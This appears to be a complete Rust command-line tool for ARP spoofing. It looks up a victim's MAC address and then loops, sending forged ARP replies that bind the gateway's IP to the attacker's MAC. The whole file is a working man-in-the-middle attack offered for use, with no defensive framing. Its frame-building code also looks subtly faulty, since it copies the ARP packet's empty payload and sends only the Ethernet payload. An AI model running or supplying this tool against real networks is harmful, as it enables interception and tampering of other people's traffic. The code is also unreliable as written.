extern crate pnet;

use core::time;
use std::net::{IpAddr, Ipv4Addr};
use std::thread;

use clap::Parser;

use pnet::datalink::{Channel, MacAddr, NetworkInterface};
use pnet::packet::Packet;
use pnet::packet::arp::{ArpHardwareTypes, ArpOperations, ArpPacket, MutableArpPacket};
use pnet::packet::ethernet::EtherTypes;
use pnet::packet::ethernet::MutableEthernetPacket;

fn send_to(interface: &NetworkInterface, source: &MacAddr, destination: &MacAddr, packet: &ArpPacket) {
    let (mut sender, _) = match pnet::datalink::channel(interface, Default::default()) {
        Ok(Channel::Ethernet(tx, rx)) => (tx, rx),
        Ok(_) => panic!("Unknown channel type"),
        Err(e) => panic!("Error occured {}", e)
    };
    
    // Build ethernet request packet
    let mut ethernet_buffer = [0u8; 42];
    let mut ethernet_packet = MutableEthernetPacket::new(&mut ethernet_buffer).unwrap();

    ethernet_packet.set_destination(*destination);
    ethernet_packet.set_source(*source);
    ethernet_packet.set_ethertype(EtherTypes::Arp);
    ethernet_packet.set_payload(packet.payload());

    // Send ethernet packet
    sender
        .send_to(ethernet_packet.payload(), None)
        .unwrap()
        .unwrap();

    println!("Packet sent from {} to {}", *source, *destination);
}

fn get_source_ip(interface: &NetworkInterface) -> Ipv4Addr {
    interface
        .ips
        .iter()
        .find(|ip| ip.is_ipv4())
        .map(|ip| match ip.ip() {
            IpAddr::V4(ip) => ip,
            _ => unreachable!(),
        })
        .unwrap()
}

fn request_mac(interface: &NetworkInterface, attacker_mac: &MacAddr, attacker_ip: &Ipv4Addr, victim_ip: &Ipv4Addr) -> MacAddr {
    let mut arp_buffer = [0u8; 28];
    let mut request = MutableArpPacket::new(&mut arp_buffer).unwrap();

    request.set_hardware_type(ArpHardwareTypes::Ethernet);
    request.set_protocol_type(EtherTypes::Ipv4);
    request.set_hw_addr_len(6);
    request.set_proto_addr_len(4);
    request.set_operation(ArpOperations::Request);
    request.set_sender_hw_addr(*attacker_mac);
    request.set_sender_proto_addr(*attacker_ip);
    request.set_target_hw_addr(MacAddr::zero());
    request.set_target_proto_addr(*victim_ip);
    
    send_to(interface, attacker_mac, &MacAddr::broadcast(), &request.to_immutable());

    let (_, mut receiver) = match pnet::datalink::channel(interface, Default::default()) {
        Ok(Channel::Ethernet(tx, rx)) => (tx, rx),
        Ok(_) => panic!("Unknown channel type"),
        Err(e) => panic!("Error occured {}", e)
    };

    // Wait for reply
    let buf = receiver.next().unwrap();

    let arp = ArpPacket::new(&buf[MutableEthernetPacket::minimum_packet_size()..]).unwrap();

    arp.get_sender_hw_addr()
}

fn arp_spoof(interface: &NetworkInterface, attacker_mac: &MacAddr, gateway_ip: &Ipv4Addr, victim_mac: &MacAddr, victim_ip: &Ipv4Addr) {
    let mut arp_buffer = [0u8; 28];
    let mut response = MutableArpPacket::new(&mut arp_buffer).unwrap();

    response.set_hardware_type(ArpHardwareTypes::Ethernet);
    response.set_protocol_type(EtherTypes::Ipv4);
    response.set_hw_addr_len(6);
    response.set_proto_addr_len(4);
    response.set_operation(ArpOperations::Reply);
    response.set_sender_hw_addr(*attacker_mac);
    response.set_sender_proto_addr(*gateway_ip);
    response.set_target_hw_addr(*victim_mac);
    response.set_target_proto_addr(*victim_ip);

    send_to(interface, attacker_mac, victim_mac, &response.to_immutable());
}

fn get_interface(iface_name: String) -> NetworkInterface {
    let interfaces = pnet::datalink::interfaces();
    interfaces
        .into_iter()
        .find(|iface| iface.name == iface_name)
        .unwrap()
}

#[derive(Parser, Debug)]
#[clap(author, version, about, long_about = None)]
struct Args {
    #[clap(short, long)]
    victim_ip: String,

    #[clap(short, long, default_value = "en0")]
    iface_name: String,

    #[clap(short, long, default_value = "192.168.20.1")]
    gateway_ip: String,

    #[clap(short, long, default_value_t = 1)]
    repeat: u64,
}

fn main() {
    let args = Args::parse();

    let victim_ip = args.victim_ip.parse::<Ipv4Addr>().unwrap();
    let gateway_ip = args.gateway_ip.parse::<Ipv4Addr>().unwrap();

    let interface = get_interface(args.iface_name);
    
    let attacker_mac = interface.mac.unwrap();
    let attacker_ip = get_source_ip(&interface);
    let victim_mac = request_mac(&interface, &attacker_mac, &attacker_ip, &victim_ip);

    println!("Victim: [IP address: {}, Mac Address {}]", victim_ip, victim_mac);
    println!("Attacker: [IP address: {}, Mac Address {}", attacker_ip, attacker_mac);
    println!("Gateway Address: {}", gateway_ip);
    println!("Interface: {}", interface.name);

    println!("Repeating every {} second (Ctrl+C to quit)\n", args.repeat);

    loop {
        arp_spoof(&interface, &attacker_mac, &gateway_ip, &victim_mac, &victim_ip);
        thread::sleep(time::Duration::from_secs(args.repeat));
    }
}
